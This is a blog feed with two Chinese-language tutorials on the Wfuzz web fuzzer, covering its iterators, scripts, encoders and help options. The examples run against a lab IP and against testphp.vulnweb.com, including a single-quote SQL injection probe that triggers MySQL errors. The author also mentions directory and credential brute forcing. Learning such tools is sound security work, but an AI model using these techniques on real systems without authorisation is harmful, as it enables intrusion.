<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-02T17:37:55+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sueisok</title><subtitle>Notes,Thoughts and Else</subtitle><author><name>true</name></author><entry><title type="html">Wfuzz的其他模块</title><link href="http://localhost:4000/blog/wfuzz1/" rel="alternate" type="text/html" title="Wfuzz的其他模块" /><published>2020-04-02T17:08:36+08:00</published><updated>2020-04-02T17:08:36+08:00</updated><id>http://localhost:4000/blog/wfuzz1</id><content type="html" xml:base="http://localhost:4000/blog/wfuzz1/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#迭代器iterators&quot; id=&quot;markdown-toc-迭代器iterators&quot;&gt;迭代器(iterators)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#脚本scripts&quot; id=&quot;markdown-toc-脚本scripts&quot;&gt;脚本(scripts)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#加密encoders&quot; id=&quot;markdown-toc-加密encoders&quot;&gt;加密(encoders)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;🤺基础用法请看上一篇&lt;/p&gt;

&lt;p&gt;🤺&lt;a href=&quot;https://wfuzz.readthedocs.io/en/latest/&quot;&gt;该项目的官网手册&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;🤺Kali Linux自带此工具&lt;/p&gt;

&lt;p&gt;🤺上一篇写了简单介绍和&lt;code class=&quot;highlighter-rouge&quot;&gt;payloads&lt;/code&gt;模块的用法，这里介绍其他三个主要模块&lt;code class=&quot;highlighter-rouge&quot;&gt;iterators&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;scripts&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;encoders&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;迭代器iterators&quot;&gt;迭代器(iterators)&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;具体说明&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e iterators

Available iterators:

  Name    | Summary                                                                       
-----------------------------------------------------------------------------------------
  chain   | Returns an iterator returns elements from the first iterable until it is  
          | exhausted, then proceeds to the next iterable, until all of the iterables are 
          | exhausted.                                                                   
  product | Returns an iterator cartesian product of input iterables.                     
  zip     | Returns an iterator that aggregates elements from each of the iterables. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iterators&lt;/code&gt;自带三个迭代器，&lt;code class=&quot;highlighter-rouge&quot;&gt;-m xxx&lt;/code&gt;使用迭代器&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;chain&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;需要两个字典，一个占位符FUZZ，&lt;code class=&quot;highlighter-rouge&quot;&gt;chain&lt;/code&gt;可以整合两个字典为一个，传入占位符，一共&lt;code class=&quot;highlighter-rouge&quot;&gt;n+m&lt;/code&gt;条payloads&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-10 -w Deutsch.txt -m chain http://172.16.70.163/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 17

===================================================================
ID           Response   Lines    Word     Chars       Payload                                     
===================================================================

000000002:   404        828 L    1806 W   36851 Ch    &quot;1&quot;                                         
000000003:   404        828 L    1806 W   36850 Ch    &quot;2&quot;                                         
000000004:   404        828 L    1806 W   36849 Ch    &quot;3&quot;                                         
000000005:   404        828 L    1806 W   36850 Ch    &quot;4&quot;                                         
000000006:   404        828 L    1806 W   36850 Ch    &quot;5&quot;                                         
000000007:   404        828 L    1806 W   36850 Ch    &quot;6&quot;                                         
000000008:   404        828 L    1806 W   36850 Ch    &quot;7&quot;                                         
000000001:   200        213 L    495 W    7870 Ch     &quot;0&quot;                                         
000000009:   404        828 L    1806 W   36850 Ch    &quot;8&quot;                                         
000000010:   404        828 L    1806 W   36850 Ch    &quot;9&quot;                                         
000000013:   404        828 L    1806 W   36886 Ch    &quot;Milch&quot;                                     
000000014:   404        828 L    1806 W   36886 Ch    &quot;Apfel&quot;                                     
000000017:   404        828 L    1806 W   36895 Ch    &quot;Schule&quot;                                    
000000011:   404        828 L    1806 W   36859 Ch    &quot;10&quot;                                        
000000012:   404        828 L    1806 W   36877 Ch    &quot;Heft&quot;                                      
000000015:   404        828 L    1806 W   36976 Ch    &quot;Schweinefleisch&quot;                           
000000016:   404        828 L    1806 W   36895 Ch    &quot;Kamera&quot;                                    

Total time: 0.215062
Processed Requests: 17
Filtered Requests: 0
Requests/sec.: 79.04683
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;product&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;需要两个字典，两个占位符FUZZ，&lt;code class=&quot;highlighter-rouge&quot;&gt;product&lt;/code&gt;可以排列组合两个字典，按顺序传入占位符，一共&lt;code class=&quot;highlighter-rouge&quot;&gt;n*m&lt;/code&gt;条payloads&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-3 -w Deutsch.txt -m product http://172.16.70.163/FUZZ=FUZ2Z

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ=FUZ2Z
Total requests: 16

===================================================================
ID           Response   Lines    Word     Chars       Payload                                     
===================================================================

000000001:   404        828 L    1807 W   36895 Ch    &quot;0 - Heft&quot;                                  
000000002:   404        828 L    1807 W   36904 Ch    &quot;0 - Milch&quot;                                 
000000003:   404        828 L    1807 W   36902 Ch    &quot;0 - Apfel&quot;                                 
000000004:   404        828 L    1807 W   36993 Ch    &quot;0 - Schweinefleisch&quot;                       
000000005:   404        828 L    1807 W   36894 Ch    &quot;1 - Heft&quot;                                  
000000006:   404        828 L    1807 W   36903 Ch    &quot;1 - Milch&quot;                                 
000000007:   404        828 L    1807 W   36903 Ch    &quot;1 - Apfel&quot;                                 
000000008:   404        828 L    1807 W   36994 Ch    &quot;1 - Schweinefleisch&quot;                       
000000009:   404        828 L    1807 W   36894 Ch    &quot;2 - Heft&quot;                                  
000000010:   404        828 L    1807 W   36903 Ch    &quot;2 - Milch&quot;                                 
000000011:   404        828 L    1807 W   36903 Ch    &quot;2 - Apfel&quot;                                 
000000012:   404        828 L    1807 W   36993 Ch    &quot;2 - Schweinefleisch&quot;                       
000000013:   404        828 L    1807 W   36894 Ch    &quot;3 - Heft&quot;                                  
000000014:   404        828 L    1807 W   36904 Ch    &quot;3 - Milch&quot;                                 
000000015:   404        828 L    1807 W   36903 Ch    &quot;3 - Apfel&quot;                                 
000000016:   404        828 L    1807 W   36994 Ch    &quot;3 - Schweinefleisch&quot;                       

Total time: 0.207002
Processed Requests: 16
Filtered Requests: 0
Requests/sec.: 77.29370
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;zip&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;需要两个字典，两个个占位符FUZZ和FU2Z，&lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt;可以两个字典一一对应，按顺序传入两个占位符，如果两个字典行数不相等则取行数少的，所以一共&lt;code class=&quot;highlighter-rouge&quot;&gt;min(n,m)&lt;/code&gt;条payloads&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-10 -w Deutsch.txt -m zip http://172.16.70.163/FUZZ=FUZ2Z

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ=FUZ2Z
Total requests: 6

===================================================================
ID           Response   Lines    Word     Chars       Payload                                     
===================================================================

000000001:   404        828 L    1807 W   36895 Ch    &quot;0 - Heft&quot;                                  
000000003:   404        828 L    1807 W   36903 Ch    &quot;2 - Apfel&quot;                                 
000000002:   404        828 L    1807 W   36904 Ch    &quot;1 - Milch&quot;                                 
000000004:   404        828 L    1807 W   36993 Ch    &quot;3 - Schweinefleisch&quot;                       
000000005:   404        828 L    1807 W   36912 Ch    &quot;4 - Kamera&quot;                                
000000006:   404        828 L    1807 W   36911 Ch    &quot;5 - Schule&quot;                                

Total time: 0.238128
Processed Requests: 6
Filtered Requests: 0
Requests/sec.: 25.19648
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其实就很像Burpsuite里面的Intruder模块，目前感觉还是Intruder好用&lt;/p&gt;

&lt;h1 id=&quot;脚本scripts&quot;&gt;脚本(scripts)&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;具体说明&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e scripts

Available scripts:

  Category                      | Name          | Summary                                              
-------------------------------------------------------------------------------------------------------
  default, active, discovery    | cvs_extractor | Parses CVS/Entries file.                             
  default, passive              | errors        | Looks for error messages                             
  default, active, discovery    | wc_extractor  | Parses subversion's wc.db file.                      
  active, discovery             | links         | Parses HTML looking for new content.                 
  re-enqueue, active, discovery | backups       | Looks for known backup filenames.                    
  default, passive              | listing       | Looks for directory listing vulnerabilities          
  default, active, discovery    | svn_extractor | Parses .svn/entries file.                            
  verbose, passive              | headers       | Looks for server headers                             
  default, active, discovery    | sitemap       | Parses sitemap.xml file                              
  verbose, passive              | cookies       | Looks for new cookies                                
  verbose, passive              | title         | Parses HTML page title                               
  tools                         | grep          | HTTP response grep                                   
  default, active, discovery    | robots        | Parses robots.txt looking for new content.           
  tools, active                 | screenshot    | Performs a screen capture using linux cutycapt tool
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;分类说明&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;参数&lt;/th&gt;
      &lt;th&gt;说明&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;passive&lt;/td&gt;
      &lt;td&gt;被动脚本分析现有请求和响应，而无需执行新请求&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;active&lt;/td&gt;
      &lt;td&gt;主动脚本对应用程序执行新请求以探测其漏洞&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;discovery&lt;/td&gt;
      &lt;td&gt;通过自动将发现的内容排入wfuzz请求的资源池，来帮助抓取网站&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;使用Scripts&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;可以先查看一下某个模块的信息&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --script-help=backups

Name: backups 0.1
Categories: re-enqueue,active,discovery
Summary: Looks for known backup filenames.
Author: Xavi Mendez (@xmendez)
Description:
   Looks for known backup filenames.
Parameters:
   - ext (= .bak,.tgz,.zip,.tar.gz,~,.rar,.old,.-.swp): Extensions to look for.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;使用scripts&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;backup&lt;/code&gt;脚本模块，&lt;code class=&quot;highlighter-rouge&quot;&gt;backups.txt&lt;/code&gt;为字典&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --script=backups -w backups.txt http://172.16.70.163/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 7

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000004:   404        828 L    1806 W   36850 Ch    &quot;4&quot;                                                
000000001:   404        828 L    1806 W   36850 Ch    &quot;1&quot;                                                
000000002:   404        828 L    1806 W   36850 Ch    &quot;2&quot;                                                
000000003:   404        828 L    1806 W   36849 Ch    &quot;3&quot;                                                
000000006:   404        828 L    1806 W   36868 Ch    &quot;saf&quot;                                              
000000005:   404        828 L    1806 W   36859 Ch    &quot;ad&quot;                                               
000000007:   404        828 L    1806 W   36868 Ch    &quot;zxs&quot;                                              

Total time: 1.044162
Processed Requests: 7
Filtered Requests: 0
Requests/sec.: 6.703940
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为了不再重复扫描相同的请求（具有相同的参数），有一个缓存，可以使用–no-cache标志禁用缓存&lt;/p&gt;

&lt;p&gt;例如，如果我们以具有相同URL但参数值不同的Web服务器为目标，则会得到&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range --zD 0-3 -z list --zD &quot;'&quot; -u http://testphp.vulnweb.com/artists.php?artist=FUZZFUZ2Z -A

000000004:   0.195s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;3 - '&quot;
|_  Error identified: Warning: mysql_fetch_array()
000000001:   0.198s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;0 - '&quot;
000000002:   0.198s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;1 - '&quot;
000000003:   0.198s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;2 - '&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;相同操作，禁用了缓存&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range --zD 0-3 -z list --zD &quot;'&quot; -u http://testphp.vulnweb.com/artists.php?artist=FUZZFUZ2Z -A --no-cache

000000004:   1.170s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;3 - '&quot;
|_  Error identified: Warning: mysql_fetch_array()
000000002:   1.173s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;1 - '&quot;
|_  Error identified: Warning: mysql_fetch_array()
000000001:   1.174s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;0 - '&quot;
|_  Error identified: Warning: mysql_fetch_array()
000000003:   1.173s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;2 - '&quot;
|_  Error identified: Warning: mysql_fetch_array()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;自定义脚本&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;如果要创建脚本，需要在“ .wfuzz”目录下创建一个名为“ scripts”的目录，将脚本放入目录下&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/xmendez/wfuzz/tree/master/src/wfuzz/plugins/scripts&quot;&gt;参考如何编写插件&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;加密encoders&quot;&gt;加密(encoders)&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;具体说明&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e encoders

Available encoders:

  Category      | Name              | Summary                                                                           
-----------------------------------------------------------------------------------------
  hashes        | base64            | Encodes the given string using base64                                             
  url           | doble_nibble_hex  | Replaces ALL characters in string using the %%dd%dd escape                        
  url_safe, url | double urlencode  | Applies a double encode to special characters in string using the %25xx escape.   
                |                   | Letters, digits, and the characters '_.-' are never quoted.                       
  url           | first_nibble_hex  | Replaces ALL characters in string using the %%dd? escape                          
  default       | hexlify           | Every byte of data is converted into the corresponding 2-digit hex representatio  
                |                   | n.                                                                                
  html          | html_decimal      | Replaces ALL characters in string using the &amp;amp;#dd; escape                          
  html          | html_escape       | Convert the characters &amp;amp;&amp;lt;&amp;gt;&quot; in string to HTML-safe sequences.                     
  html          | html_hexadecimal  | Replaces ALL characters in string using the &amp;amp;#xx; escape                          
  hashes        | md5               | Applies a md5 hash to the given string                                            
  db            | mssql_char        | Converts ALL characters to MsSQL's char(xx)                                       
  db            | mysql_char        | Converts ALL characters to MySQL's char(xx)                                       
  default       | none              | Returns string without changes                                                    
  db            | oracle_char       | Converts ALL characters to Oracle's chr(xx)                                       
  default       | random_upper      | Replaces random characters in string with its capitals letters                    
  url           | second_nibble_hex | Replaces ALL characters in string using the %?%dd escape                          
  hashes        | sha1              | Applies a sha1 hash to the given string                                           
  url           | uri_double_hex    | Encodes ALL charachers using the %25xx escape.                                    
  url           | uri_hex           | Encodes ALL charachers using the %xx escape.                                      
  url           | uri_triple_hex    | Encodes ALL charachers using the %25%xx%xx escape.                                
  url           | uri_unicode       | Replaces ALL characters in string using the %u00xx escape                         
  url_safe, url | urlencode         | Replace special characters in string using the %xx escape. Letters, digits, and   
                |                   | the characters '_.-' are never quoted.                                            
  url           | utf8              | Replaces ALL characters in string using the \u00xx escape                         
  url           | utf8_binary       | Replaces ALL characters in string using the \uxx escape
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;encoders&lt;/code&gt;的作用是将payload进行编码或加密&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;使用方法&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在字典后面直接加加密方式就可以了&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w wordlist.txt,md5 http://172.16.70.163/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 7

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000001:   404        828 L    1810 W   37237 Ch    &quot;c4ca4238a0b923820dcc509a6f75849b&quot;                 
000000002:   404        828 L    1810 W   37237 Ch    &quot;c81e728d9d4c2f636f067f89cc14862c&quot;                 
000000003:   404        828 L    1810 W   37237 Ch    &quot;eccbc87e4b5ce2fe28308fd9f2a7baf3&quot;                 
000000004:   404        828 L    1810 W   37237 Ch    &quot;a87ff679a2f3e71d9181a67b7542122c&quot;                 
000000005:   404        828 L    1810 W   37237 Ch    &quot;523af537946b79c4f8369ed39ba78605&quot;                 
000000006:   404        828 L    1810 W   37237 Ch    &quot;e8a88bb6f4d420a8517965d25cd54a14&quot;                 
000000007:   404        828 L    1810 W   37237 Ch    &quot;68f43f44054de89e6ee5ff03adb26542&quot;                 

Total time: 0.239509
Processed Requests: 7
Filtered Requests: 0
Requests/sec.: 29.22638
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;使用多个encoder&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;多个encoder，使用一个&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;号分隔的列表来指定&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -w wordlist.txt,md5-base64 http://172.16.70.163/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 14

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000001:   404        828 L    1810 W   37237 Ch    &quot;c4ca4238a0b923820dcc509a6f75849b&quot;                 
000000002:   404        828 L    1807 W   36876 Ch    &quot;MQ==&quot;                                             
000000003:   404        828 L    1810 W   37237 Ch    &quot;c81e728d9d4c2f636f067f89cc14862c&quot;                 
000000004:   404        828 L    1807 W   36876 Ch    &quot;Mg==&quot;                                             
000000005:   404        828 L    1810 W   37237 Ch    &quot;eccbc87e4b5ce2fe28308fd9f2a7baf3&quot;                 
000000006:   404        828 L    1807 W   36876 Ch    &quot;Mw==&quot;                                             
000000007:   404        828 L    1810 W   37237 Ch    &quot;a87ff679a2f3e71d9181a67b7542122c&quot;                 
000000008:   404        828 L    1807 W   36876 Ch    &quot;NA==&quot;                                             
000000009:   404        828 L    1810 W   37237 Ch    &quot;523af537946b79c4f8369ed39ba78605&quot;                 
000000013:   404        828 L    1810 W   37237 Ch    &quot;68f43f44054de89e6ee5ff03adb26542&quot;                 
000000010:   404        828 L    1806 W   36876 Ch    &quot;YWQ=&quot;                                             
000000011:   404        828 L    1810 W   37236 Ch    &quot;e8a88bb6f4d420a8517965d25cd54a14&quot;                 
000000012:   404        828 L    1806 W   36877 Ch    &quot;c2Fm&quot;                                             
000000014:   404        828 L    1806 W   36877 Ch    &quot;enhz&quot;                                             

Total time: 0.266457
Processed Requests: 14
Filtered Requests: 0
Requests/sec.: 52.54129
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;多次encoder&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;多次encoder，使用一个&lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt;号分隔的列表来指定，顺序为由右到左&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w wordlist.txt,md5@base64 http://172.16.70.163/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 7

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000003:   404        828 L    1810 W   37237 Ch    &quot;0b24df25fe628797b3a50ae0724d2730&quot;                 
000000006:   404        828 L    1810 W   37237 Ch    &quot;461194a350fdac0ef28e8b2073f34a6a&quot;                 
000000001:   404        828 L    1810 W   37237 Ch    &quot;cdd96d3cc73d1dbdaffa03cc6cd7339b&quot;                 
000000002:   404        828 L    1810 W   37235 Ch    &quot;0b7e7dee87b1c3b98e72131173dfbbbf&quot;                 
000000004:   404        828 L    1810 W   37237 Ch    &quot;f7947d50da7a043693a592b4db43b0a1&quot;                 
000000005:   404        828 L    1810 W   37237 Ch    &quot;5fae8a76529cf25432da8e49f1053e08&quot;                 
000000007:   404        828 L    1810 W   37237 Ch    &quot;4094c4aed3ced5fbd69159b16af12b7b&quot;                 

Total time: 1.048273
Processed Requests: 7
Filtered Requests: 0
Requests/sec.: 6.677649
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>true</name></author><category term="fuzz" /><summary type="html">🤺基础用法请看上一篇</summary></entry><entry><title type="html">fuzz第一步，Wfuzz来指路</title><link href="http://localhost:4000/blog/wfuzz0/" rel="alternate" type="text/html" title="fuzz第一步，Wfuzz来指路" /><published>2020-03-31T15:13:21+08:00</published><updated>2020-03-31T15:13:21+08:00</updated><id>http://localhost:4000/blog/wfuzz0</id><content type="html" xml:base="http://localhost:4000/blog/wfuzz0/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#说明书&quot; id=&quot;markdown-toc-说明书&quot;&gt;说明书&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#字典&quot; id=&quot;markdown-toc-字典&quot;&gt;字典&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#载荷payloads&quot; id=&quot;markdown-toc-载荷payloads&quot;&gt;载荷(payloads)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#输出格式&quot; id=&quot;markdown-toc-输出格式&quot;&gt;输出格式&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#过滤&quot; id=&quot;markdown-toc-过滤&quot;&gt;过滤&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#递归测试&quot; id=&quot;markdown-toc-递归测试&quot;&gt;递归测试&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#其他&quot; id=&quot;markdown-toc-其他&quot;&gt;其他&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;🤺&lt;a href=&quot;https://wfuzz.readthedocs.io/en/latest/&quot;&gt;该项目的官网手册&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;🤺Kali Linux自带此工具&lt;/p&gt;

&lt;p&gt;🤺到目前为止对这个工具最大的感觉就是，目录爆破，爆破用户名和密码，之后会尝试各种注入，见缝插针&lt;/p&gt;

&lt;p&gt;🤺内心os，以上这些都对字典的依赖比较大，是一个需要自己想办法维护的工具，在我菜鸡的手里和别人的手里就很不一样，所以就是个人积累问题了，通过个人的积累和增删，让工具更顺敏锐&lt;/p&gt;

&lt;h1 id=&quot;说明书&quot;&gt;说明书&lt;/h1&gt;

&lt;p&gt;完整版help如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --help
···
Options:
    -h/--help                 : This help
    --help                    : Advanced help
    --filter-help             : Filter language specification
    --version                 : Wfuzz version details
    -e &amp;lt;type&amp;gt;                 : List of available encoders/payloads/iterators/printers/scripts
    
    --recipe &amp;lt;filename&amp;gt;       : Reads options from a recipe. Repeat for various recipes.
    --dump-recipe &amp;lt;filename&amp;gt;  : Prints current options as a recipe
    --oF &amp;lt;filename&amp;gt;           : Saves fuzz results to a file. These can be consumed later using the wfuzz payload.
    
    -c                        : Output with colors
    -v                        : Verbose information.
    -f filename,printer       : Store results in the output file using the specified printer (raw printer if omitted).
    -o printer                : Show results using the specified printer.
    --interact                : (beta) If selected,all key presses are captured. This allows you to interact with the program.
    --dry-run                 : Print the results of applying the requests without actually making any HTTP request.
    --prev                    : Print the previous HTTP requests (only when using payloads generating fuzzresults)
    --efield &amp;lt;expr&amp;gt;           : Show the specified language expression together with the current payload
    --field &amp;lt;expr&amp;gt;            : Do not show the payload but only the specified language expression
    
    -p addr                   : Use Proxy in format ip:port:type. Repeat option for using various proxies.
                                Where type could be SOCKS4,SOCKS5 or HTTP if omitted.
    
    -t N                      : Specify the number of concurrent connections (10 default)
    -s N                      : Specify time delay between requests (0 default)
    -R depth                  : Recursive path discovery being depth the maximum recursion level.
    -L,--follow               : Follow HTTP redirections
    --ip host:port            : Specify an IP to connect to instead of the URL's host in the format ip:port
    -Z                        : Scan mode (Connection errors will be ignored).
    --req-delay N             : Sets the maximum time in seconds the request is allowed to take (CURLOPT_TIMEOUT). Default 90.
    --conn-delay N            : Sets the maximum time in seconds the connection phase to the server to take (CURLOPT_CONNECTTIMEOUT). Default 90.
    
    -A, --AA, --AAA           : Alias for --script=default,verbose,discovery -v -c
    --no-cache                : Disable plugins cache. Every request will be scanned.
    --script=                 : Equivalent to --script=default
    --script=&amp;lt;plugins&amp;gt;        : Runs script's scan. &amp;lt;plugins&amp;gt; is a comma separated list of plugin-files or plugin-categories
    --script-help=&amp;lt;plugins&amp;gt;   : Show help about scripts.
    --script-args n1=v1,...   : Provide arguments to scripts. ie. --script-args grep.regex=&quot;&amp;lt;A href=\&quot;(.*?)\&quot;&amp;gt;&quot;
    
    -u url                    : Specify a URL for the request.
    -m iterator               : Specify an iterator for combining payloads (product by default)
    -z payload                : Specify a payload for each FUZZ keyword used in the form of name[,parameter][,encoder].
                                A list of encoders can be used, ie. md5-sha1. Encoders can be chained, ie. md5@sha1.
                                Encoders category can be used. ie. url
                                Use help as a payload to show payload plugin's details (you can filter using --slice)
    --zP &amp;lt;params&amp;gt;             : Arguments for the specified payload (it must be preceded by -z or -w).
    --zD &amp;lt;default&amp;gt;            : Default parameter for the specified payload (it must be preceded by -z or -w).
